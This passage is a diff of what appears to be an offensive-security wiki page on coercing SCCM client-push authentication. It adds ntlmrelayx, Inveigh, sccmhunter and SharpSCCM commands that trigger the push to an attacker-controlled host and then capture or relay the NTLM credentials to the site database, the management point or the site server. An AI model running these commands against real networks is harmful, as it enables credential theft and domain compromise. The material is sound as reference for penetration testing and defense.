@@ -38,28 +38,53 @@ Inveigh.exe
 
 ##### Step 1: prepare coercion listener
 
-Note that you could either capture & crack received credentials or relay them to a suitable target system (or both).
+Note that you can either capture and crack received credentials or relay them to a suitable target system (or both). Possible targets include the SCCM database (MSSQL), which is usually not signed, the management point (SMB), or the site server (HTTP), etc. depending on client push user privileges and whether signing or encryption is enabled.
+::: tabs
+=== UNIX-like
 
-```sh
-# On Linux
-## Relay using ntlmrelayx.py
-ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
+
+```bash
+# Relay using ntlmrelayx.py
+ntlmrelayx.py -smb2support -socks -ts -ip $ATTACKER_IP -t $TARGET
 ```
+
+=== Windows
+
+Credential capture using Inveigh:
+
 ```powershell
-# On Windows
-## Credential capture using Inveigh 
 Inveigh.exe
 ```
 
-##### Step 2: trigger Client-Push Installation
+:::
 
-```PowerShell
+##### Step 2: trigger Client-Push Installation
+::: tabs
+
+=== UNIX-like
+
+
+```bash
+# A. With a user/machine account that will:
+#    (1) create a new machine account in the domain
+#    (2) register a new client
+python3 sccmhunter.py http -mp $TARGET -u $USER -p "$PASSWORD" -sleep 3 -sp -spcn $ATTACKER_IP -dc-ip $DC_IP -d $DOMAIN
+
+# B. Unauthenticated registration (may not work in all cases), proven to be efficiant during tests
+python3 sccmhunter.py http -mp $TARGET -sleep 10 -sp -spcn $ATTACKER_IP -dc-ip $DC_IP -d $DOMAIN -sppid 'Microsoft Windows NT Server 10.0' --sccm-push-anonymous
+```
+
+=== Windows
+
+```powershell
 # If admin access over Management Point (MP)
 SharpSCCM.exe invoke client-push -t $TARGET --as-admin
 
 # If not MP admin
 SharpSCCM.exe invoke client-push -t $TARGET
 ```
+
+:::
 
 ##### Step 3: cleanup
 
